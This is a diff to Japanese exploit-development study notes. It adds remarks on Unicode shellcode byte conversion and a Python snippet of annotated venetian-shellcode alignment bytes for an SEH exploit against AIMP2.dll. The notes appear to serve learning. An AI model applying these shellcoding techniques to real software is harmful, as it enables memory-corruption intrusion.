@@ -1871,6 +1871,9 @@ s.close()
 ```
 ### Unicode shellcoding
 入力された文字列がUnicode形式でメモリに保存される場合、`0x4141`が`0x00410041`となるため通常時のようにはいかない。   
+0x00~0x7fまでは`0x41->0x0041`と変換されるが、それ以上は必ずしも0x00が付くだけとは限らない！   
+`0x81->0xac20`とか。とくに0x80~0x9fあたりがヤバそう。詳しくは以下を参照   
+https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf   
 #### pop,pop,retの検索
 SEHを使用したExploitの場合、`0x0045000e`みたいな感じのアドレス形式の`pop,pop,ret`を探す必要がある。   
 `！mona seh -m AIMP2.dll -cp unicode`   
@@ -1936,6 +1939,39 @@ jmp = "\x50" # push eax
 jmp += "\x6d" # nop
 jmp += "\xc3" # ret
 
+```
+上の方法だと、最低でも0x100バイト分の調整しかできないが、0xb0バイトの微調整がしたい場合、以下のようにやるといけた。   
+```python
+# nasm > mov ecx,0xaa005000
+# 00000000  B9005000AA        mov ecx,0xaa005000
+# nasm > add al,ch
+# 00000000  00E8              add al,ch
+# nasm > add byte[ebp],CH
+# 00000000  006D00            add [ebp+0x0],ch
+#>>> hex(0x100 - 0xb0)                         目標は0012de58 -> 0012dda8 !!!
+#'0x50'                                        0xdeと0x58を両方変更する必要があるため
+                                               add al,chみたいなのを2回行う
+# eax=0012de58 -> 0012dea8 (add 0x50)      [1] まずは最下位１バイト(al)にadd al,chすることで、
+align += "\xb9\x50\xaa\xe8\x6d"                0x58 + 0x50 = 0xa8 とする！
+
+
+# nasm > mov ecx,0xaa007e00
+# 00000000  B9007E00AA        mov ecx,0xaa007e00 次は0xde->0xddのため -1 する。
+# nasm > add ch,ch                               つまり、0xffを加算するのに等しい。
+# 00000000  00ED              add ch,ch          0xffは0x7fよりも大きいため0x00ffとは変換されないかも
+# nasm > add ah,ch                               なので、0xff=ox7e*2+0x3 に分割してADDする
+# 00000000  00EC              add ah,ch       [*] 多分0xffは大丈夫っぽい…
+# nasm > add byte[ebp],CH
+# 00000000  006D00            add [ebp+0x0],ch
+# nasm > mov ecx,0xaa000300
+# 00000000  B9000300AA        mov ecx,0xaa000300
+# nasm > add ah,ch
+# 00000000  00EC              add ah,ch
+# nasm > add byte[ebp],CH
+# 00000000  006D00            add [ebp+0x0],ch
+
+# eax=0012dea8 -> 0012dda8 (add 0xff) 
+align += "\xb9\x7e\xaa\xed\xec\x6d\xb9\x03\xaa\xec\x6d"
 ```
 ## よく見るかたまり
 #### 関数の先頭
